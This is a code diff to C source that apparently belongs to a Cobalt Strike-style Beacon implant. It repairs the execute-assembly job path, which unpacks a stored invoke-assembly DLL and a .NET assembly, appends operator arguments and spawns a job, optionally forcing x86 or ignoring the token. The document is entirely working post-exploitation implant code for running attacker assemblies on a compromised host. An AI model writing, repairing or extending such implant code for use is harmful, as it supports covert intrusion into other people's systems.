@@ -430,22 +430,46 @@ void command_data_store_execute_assembly(char * buffer, int length, BOOL x86, BO
 	offset = data_int(&job);
 	memset(desc, 0, sizeof(desc));
 	dlen = data_string(&job, desc, 64);
-	/* stored object: length-prefixed DLL then remainder */
+	/* Store item is ExecuteAssemblyJob.getDataStoreObject():
+	 *   addLengthAndString(invokeassembly DLL) + addInt(asmLen)+asm
+	 * Cmd extra is getArgument()'s trailing wide args only.
+	 * Job parameter must be [len][assembly][wide args], not extra alone. */
 	{
 		datap stored;
+		char * rest;
+		int restlen;
+		char * param;
+		int plen;
+
 		data_init(&stored, item->buffer, (int)item->length);
 		dlllen = (int)data_int(&stored);
 		dll = data_ptr(&stored, dlllen);
+		if (dll == NULL) {
+			BeaconDataStoreProtectItem((size_t)index);
+			return;
+		}
+		rest = data_buffer(&stored);
+		restlen = data_length(&stored);
+		plen = restlen + extra.length;
+		param = NULL;
+		if (plen > 0) {
+			param = (char *)malloc((size_t)plen);
+			if (param == NULL) {
+				BeaconDataStoreProtectItem((size_t)index);
+				return;
+			}
+			if (restlen > 0)
+				memcpy(param, rest, (size_t)restlen);
+			if (extra.length > 0 && extra.buffer != NULL)
+				memcpy(param + restlen, extra.buffer, (size_t)extra.length);
+		}
+		x86 = (inner_type == 70 || inner_type == 87);
+		ignoreToken = (inner_type == 70 || inner_type == 71);
+		/* TEMP cmd117 experiment: if force pipe is listening, spawn same-arch x86 job (not a permanent fix). */
+		if (cmd117_force_x86_job())
+			x86 = TRUE;
+		command_job_spawn_logic(jtype, wait, offset, dll, (DWORD)dlllen, param, (DWORD)plen, desc, dlen, x86, ignoreToken);
+		free(param);
 	}
-	if (dll == NULL) {
-		BeaconDataStoreProtectItem((size_t)index);
-		return;
-	}
-	x86 = (inner_type == 70 || inner_type == 87);
-	ignoreToken = (inner_type == 70 || inner_type == 71);
-	/* TEMP cmd117 experiment: if force pipe is listening, spawn same-arch x86 job (not a permanent fix). */
-	if (cmd117_force_x86_job())
-		x86 = TRUE;
-	command_job_spawn_logic(jtype, wait, offset, dll, (DWORD)dlllen, extra.buffer, extra.length, desc, dlen, x86, ignoreToken);
 	BeaconDataStoreProtectItem((size_t)index);
 }
